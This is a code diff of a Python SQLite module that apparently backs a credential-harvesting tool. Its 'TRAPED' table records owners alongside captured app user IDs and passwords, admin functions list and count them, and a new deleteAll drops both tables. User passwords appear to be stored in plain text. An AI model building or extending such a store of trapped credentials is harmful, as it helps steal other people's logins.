@@ -1,5 +1,8 @@
 import sqlite3
+conn=None
+
 def ConnectionToTrapedDB():
+    global conn
     conn=sqlite3.connect('TrappedData.db',check_same_thread=False)
     conn.execute('''CREATE TABLE IF NOT EXISTS TRAPED
             (OWNER TEXT     NOT NULL,
@@ -13,6 +16,7 @@ def ConnectionToTrapedDB():
     return conn
 
 def ConnectionToUserDB():
+    global conn
     conn=sqlite3.connect('UserData.db',check_same_thread=False)
     conn.execute('''CREATE TABLE IF NOT EXISTS USERS
             (UID  TEXT PRIMARY KEY NOT NULL,
@@ -65,7 +69,7 @@ def insertIntoTraped(owner,site,uid,pas):
 
 
 
-
+#get the traped data for user
 def getTrapedDataForOwner(uid):
     cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=?",(uid,))
     return cursor
@@ -73,28 +77,31 @@ def getTrapedDataForOwner(uid):
 
 
 #for admin
-def showTrapedData():
+def getTrapedData():
     cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
-    for row in cursor:
-        print("owner = ",row[0])
-        print("app = ",row[1])
-        print("userid = ", row[2])
-        print("password = ", row[3],"\n")
-    print("numbers of Traped users",cursor.execute("select count(*) from TRAPED").fetchall()[-1][-1])
+    n=ConnectionToTrapedDB().execute("select count(*) from TRAPED").fetchall()[-1][-1]
+    return [cursor,n]
 
 
  #for admin      
-def showUserData():
+def getUserData():
     cursor = ConnectionToUserDB().execute("SELECT UID,EMAIL,PASSWORD from USERS")
-    for row in cursor:
-        print("UID = ",row[0])
-        print("EMAIL = ",row[1])
-        print("password = ", row[2],"\n")
-    print("numbers of users",cursor.execute("select count(*) from USERS").fetchall()[-1][-1])
+    n=ConnectionToUserDB().execute("select count(*) from USERS").fetchall()[-1][-1]
+    return [cursor,n]
     
 
 
+
+
+
+
+
+
+
 #for admin
-def deleteTrapedData():
+def deleteAll():
     ConnectionToTrapedDB().execute("drop table TRAPED")
+    conn.close()
+    ConnectionToUserDB().execute("drop table USERS")
+    conn.close()
     print("data deleted")
